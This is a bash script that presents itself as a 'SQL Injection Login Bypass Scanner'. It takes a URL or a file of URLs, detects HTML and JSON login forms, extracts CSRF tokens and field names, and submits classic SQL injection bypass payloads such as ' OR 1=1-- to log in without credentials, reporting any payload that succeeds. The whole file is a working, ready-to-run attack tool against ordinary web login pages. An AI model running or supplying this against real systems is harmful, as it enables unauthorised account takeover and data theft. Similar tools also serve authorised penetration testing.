#!/bin/bash

# Configuration
USER_AGENT="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
TIMEOUT=10
COOKIE_FILE="/tmp/sqli_cookies_$$.txt"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

WARNING="⚠️"
CHECK="✓"

# Cleanup function
cleanup() {
    rm -f /tmp/original_*.txt /tmp/sqli_*.txt 2>/dev/null
}
trap cleanup EXIT

# Check if page is a login form or API endpoint
is_login_page() {
    local html="$1"
    
    # Check for HTML login forms
    local patterns=(
        '<form[^>]*login'                # form with login
        'type=["'\'']?password["'\'']?'  # password field
        'name=["'\'']?username["'\'']?'  # username field
        'name=["'\'']?password["'\'']?'  # password name
        'action=["'\'']?.*login["'\'']?' # login action
        '<h1[^>]*>Login'                 # Login heading
        'id=["'\'']?login-form["'\'']?'  # login-form id
        'class=["'\'']?.*login.*["'\'']?' # login class
    )
    
    local score=0
    for pattern in "${patterns[@]}"; do
        if echo "$html" | grep -iq "$pattern"; then
            ((score++))
        fi
    done
    
    # Also check for common login page indicators
    if echo "$html" | grep -iq "log.*in\|sign.*in\|authentication"; then
        ((score+=2))
    fi
    
    # Return true if score >= 4 (likely a login page)
    [ $score -ge 4 ]
}

# Check if endpoint is JSON API login
is_json_api() {
    local url="$1"
    local html="$2"
    
    # Check URL for API patterns
    if echo "$url" | grep -iq "api\|/login\|/auth\|/signin"; then
        return 0
    fi
    
    # Check response for JSON indicators
    if echo "$html" | head -20 | grep -iq "content-type.*application/json\|{.*}"; then
        return 0
    fi
    
    return 1
}

# Extract login form details
extract_login_form() {
    local html="$1"
    local is_json="$2"
    
    if [ "$is_json" = true ]; then
        # For JSON APIs, we'll use common field names
        echo "JSON|POST||username|password"
        return
    fi
    
    # Extract form action URL
    local action_url=$(echo "$html" | grep -i '<form' | grep -o 'action=["'\'']\?[^"'\'' ]*' | cut -d'"' -f2 | cut -d"'" -f2 | head -1)
    
    # Extract input fields
    local inputs=$(echo "$html" | grep -i '<input' | sed 's/.*<input//i')
    
    # Extract method (default to POST)
    local method=$(echo "$html" | grep -i '<form' | grep -o 'method=["'\'']\?[^"'\'' ]*' | cut -d'"' -f2 | cut -d"'" -f2 | tr '[:lower:]' '[:upper:]')
    method="${method:-POST}"
    
    # Find CSRF token
    local csrf_token=""
    if echo "$html" | grep -qi 'csrf\|token'; then
        csrf_token=$(echo "$html" | grep -i 'name=["'\'']\?csrf["'\'']\?' -A1 | grep -o 'value=["'\'']\?[^"'\'' ]*' | cut -d'"' -f2 | cut -d"'" -f2)
        if [ -z "$csrf_token" ]; then
            csrf_token=$(echo "$html" | grep -i 'value=["'\'']\?.*' | grep -i input | grep -o 'value=["'\'']\?[^"'\'' ]*' | tail -1 | cut -d'"' -f2 | cut -d"'" -f2)
        fi
    fi
    
    # Find username field name
    local username_field=$(echo "$inputs" | grep -i 'username\|email\|user\|login' | grep -o 'name=["'\'']\?[^"'\'' ]*' | cut -d'"' -f2 | cut -d"'" -f2 | head -1)
    username_field="${username_field:-username}"
    
    # Find password field name
    local password_field=$(echo "$inputs" | grep -i 'password\|pass\|pwd' | grep -o 'name=["'\'']\?[^"'\'' ]*' | cut -d'"' -f2 | cut -d"'" -f2 | head -1)
    password_field="${password_field:-password}"
    
    echo "$action_url|$method|$csrf_token|$username_field|$password_field"
}

# Curl wrapper for both form and JSON
curl_request() {
    local url="$1"
    local method="$2"
    local data="$3"
    local content_type="$4"
    local follow_redirect="${5:-0}"
    
    local curl_opts=(
        -s
        --max-time "$TIMEOUT"
        --user-agent "$USER_AGENT"
        --cookie "$COOKIE_FILE"
        --cookie-jar "$COOKIE_FILE"
        -w "\n%{http_code}\n%{url_effective}"
    )
    
    if [ "$follow_redirect" -eq 1 ]; then
        curl_opts+=(--location)
    fi
    
    curl_opts+=(-X "$method")
    
    if [ -n "$content_type" ]; then
        curl_opts+=(-H "Content-Type: $content_type")
    fi
    
    if [ -n "$data" ]; then
        curl_opts+=(--data-raw "$data")
    fi
    
    curl "${curl_opts[@]}" "$url" 2>/dev/null
}

# Test SQL injection on login (both form and JSON)
test_login_sqli() {
    local base_url="$1"
    
    # Step 1: Fetch the login page
    response=$(curl_request "$base_url" "GET" "" "" 0)
    http_code=$(echo "$response" | tail -2 | head -1)
    final_url=$(echo "$response" | tail -1)
    html=$(echo "$response" | head -n -2)
    

# Determine if it's JSON API or HTML form
local is_json=false
local is_api=false
local is_login=false

# First check if it's a login page
if is_login_page "$html"; then
    is_login=true
fi

# Check if it's a JSON API
if is_json_api "$base_url" "$html"; then
    is_api=true
fi

# Determine if it's JSON API login
if [ "$is_api" = true ] && [ "$is_login" = true ]; then
    is_json=true
    echo "[+] JSON API login endpoint detected"
    echo "Attempting to SQL Inject Login Page"
elif [ "$is_login" = true ]; then
    echo "[+] HTML login form detected"
    echo "Attempting to SQL Inject Login Page"
else
    #echo "[-] Not a login page"
    return 1
fi

 
    
    # Step 2: Extract form details
    form_details=$(extract_login_form "$html" "$is_json")
    action_url=$(echo "$form_details" | cut -d'|' -f1)
    method=$(echo "$form_details" | cut -d'|' -f2)
    csrf_token=$(echo "$form_details" | cut -d'|' -f3)
    username_field=$(echo "$form_details" | cut -d'|' -f4)
    password_field=$(echo "$form_details" | cut -d'|' -f5)
    
    # Handle URLs
    if [ "$action_url" = "JSON" ]; then
        # JSON API endpoint
        action_url="$base_url"
        content_type="application/json"
    elif [[ ! "$action_url" =~ ^https?:// ]] && [ -n "$action_url" ]; then
        if [[ "$action_url" =~ ^/ ]]; then
            domain=$(echo "$final_url" | sed -E 's|(https?://[^/]+).*|\1|')
            action_url="${domain}${action_url}"
        else
            action_url="${final_url%/*}/${action_url}"
        fi
    elif [ -z "$action_url" ]; then
        action_url="$final_url"
    fi
    
    echo "    Login URL: $action_url"
    
    # Step 3: Test normal login (should fail)
    normal_data=""
    if [ "$is_json" = true ]; then
        # JSON format
        normal_data="{\"${username_field}\":\"testuser\",\"${password_field}\":\"wrongpassword\"}"
    else
        # Form format
        if [ -n "$csrf_token" ]; then
            normal_data="csrf=${csrf_token}&"
        fi
        normal_data+="${username_field}=testuser&${password_field}=wrongpassword"
    fi
    
    normal_response=$(curl_request "$action_url" "$method" "$normal_data" "$content_type" 1)
    normal_http_code=$(echo "$normal_response" | tail -2 | head -1)
    normal_final_url=$(echo "$normal_response" | tail -1)
    normal_html=$(echo "$normal_response" | head -n -2)
    
    echo "$normal_html" > /tmp/original_login.txt
    
    # Step 4: Test SQL injection login
    payloads=(
        "admin' OR '1'='1'-- -"
        "administrator'--"
        "' OR 1=1--"
        "admin'/*"
        "' OR 'a'='a"
        "admin' OR '1'='1'#"
        "' OR '1'='1'-- -"
        "admin' OR '1'='1"
    )
    
    vulnerable=0
    for payload in "${payloads[@]}"; do
        # Build SQLi data
        if [ "$is_json" = true ]; then
            # JSON format with SQL injection in username
            sqli_data="{\"${username_field}\":\"${payload}\",\"${password_field}\":\"anything\"}"
        else
            # Form format
            sqli_data=""
            if [ -n "$csrf_token" ]; then
                sqli_data="csrf=${csrf_token}&"
            fi
            # URL encode for form data
            encoded_payload=$(echo "$payload" | sed 's/ /%20/g; s/'\''/%27/g; s/"/%22/g; s/#/%23/g; s/+/%2B/g')
            sqli_data+="${username_field}=${encoded_payload}&${password_field}=anything"
        fi
        
        sqli_response=$(curl_request "$action_url" "$method" "$sqli_data" "$content_type" 1)
        sqli_http_code=$(echo "$sqli_response" | tail -2 | head -1)
        sqli_final_url=$(echo "$sqli_response" | tail -1)
        sqli_html=$(echo "$sqli_response" | head -n -2)
        
        # Detection logic
        if [ "$sqli_http_code" -eq 200 ] || [ "$sqli_http_code" -eq 302 ]; then
            # Check for success indicators
            if echo "$sqli_html" | grep -iq "welcome\|logout\|my account\|dashboard\|success\|logged in\|token"; then
                vulnerable=1
                break
            fi
            
            # For JSON APIs, check for success in JSON response
            if [ "$is_json" = true ]; then
                if echo "$sqli_html" | grep -iq "\"success\":true\|\"token\":\|\"access_token\":\|\"authenticated\":true"; then
                    vulnerable=1
                    break
                fi
            fi
            
            # Check if we're redirected away from login page
            if [ "$normal_final_url" = "$final_url" ] && [ "$sqli_final_url" != "$final_url" ]; then
                vulnerable=1
                break
            fi
            
            # Compare response sizes
            normal_len=$(echo "$normal_html" | wc -c)
            sqli_len=$(echo "$sqli_html" | wc -c)
            
            if [ "$sqli_len" -gt $((normal_len * 2)) ]; then
                vulnerable=1
                break
            fi
        fi
        
        sleep 0.3
    done
    
    if [ $vulnerable -eq 1 ]; then
        echo -e "${RED}[VULNERABLE] ⚠️  VULNERABLE TO SQL INJECTION LOGIN BYPASS!${NC}"
        echo -e "    URL: ${YELLOW}$base_url${NC}"
        echo -e "    Successful payload: ${YELLOW}$payload${NC}"
        if [ "$is_json" = true ]; then
            echo -e "    Format: ${BLUE}JSON API${NC}"
        else
            echo -e "    Format: ${BLUE}HTML Form${NC}"
        fi
        return 0
    else
        #echo "[-] No SQL injection vulnerability detected"
        return 1
    fi
}

# Test specific JSON API endpoint
test_json_api_sqli() {
    local api_url="$1"
    
    echo "[+] Testing JSON API: $api_url"
    
    # Common JSON API field names
    username_fields=("username" "user" "email" "login")
    password_fields=("password" "pass" "pwd")
    
    # Test payloads
    payloads=(
        "admin' OR '1'='1'-- -"
        "administrator'--"
        "' OR 1=1--"
        "admin'/*"
    )
    
    for user_field in "${username_fields[@]}"; do
        for pass_field in "${password_fields[@]}"; do
            for payload in "${payloads[@]}"; do
                # Create JSON payload
                json_data="{\"${user_field}\":\"${payload}\",\"${pass_field}\":\"test\"}"
                
                # Send request
                response=$(curl -s -X POST \
                    --max-time "$TIMEOUT" \
                    -H "Content-Type: application/json" \
                    -H "User-Agent: $USER_AGENT" \
                    --cookie "$COOKIE_FILE" \
                    --cookie-jar "$COOKIE_FILE" \
                    -d "$json_data" \
                    "$api_url")
                
                # Check for success
                if echo "$response" | grep -iq "success\|token\|authenticated\|welcome"; then
                    echo -e "${RED}[VULNERABLE] JSON API SQL Injection!${NC}"
                    echo -e "    URL: ${YELLOW}$api_url${NC}"
                    echo -e "    Payload: ${YELLOW}$payload${NC}"
                    echo -e "    JSON: ${BLUE}$json_data${NC}"
                    return 0
                fi
            done
        done
    done
    
    return 1
}

# Main function to scan URLs
scan_urls() {
    local input="$1"
    
    if [ -f "$input" ]; then
        while IFS= read -r url || [ -n "$url" ]; do
            [[ -z "$url" ]] && continue
            [[ "$url" =~ ^# ]] && continue
            
            echo "--------------------------------------------------"
            test_login_sqli "$url"
            echo
            sleep 1
        done < "$input"
    else
        test_login_sqli "$input"
    fi
}

# Usage
show_help() {
    echo "SQL Injection Login Bypass Scanner"
    echo "Usage: $0 [OPTIONS] <URL or FILE>"
    echo
    echo "Options:"
    echo "  -j, --json     Test as JSON API (skip detection)"
    echo "  -h, --help     Show this help message"
    echo
    echo "Examples:"
    echo "  $0 https://example.com/login"
    echo "  $0 https://api.example.com/login -j"
    echo "  $0 urls.txt"
}

# Main execution
main() {
    local test_json=false
    
    # Parse arguments
    while [[ $# -gt 0 ]]; do
        case $1 in
            -j|--json)
                test_json=true
                shift
                ;;
            -h|--help)
                show_help
                exit 0
                ;;
            *)
                url="$1"
                shift
                ;;
        esac
    done
    
    if [ -z "$url" ]; then
        show_help
        exit 1
    fi
    
    if [ "$test_json" = true ]; then
        test_json_api_sqli "$url"
    else
        scan_urls "$url"
    fi
}

# Run main if script is executed directly
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    main "$@"
fi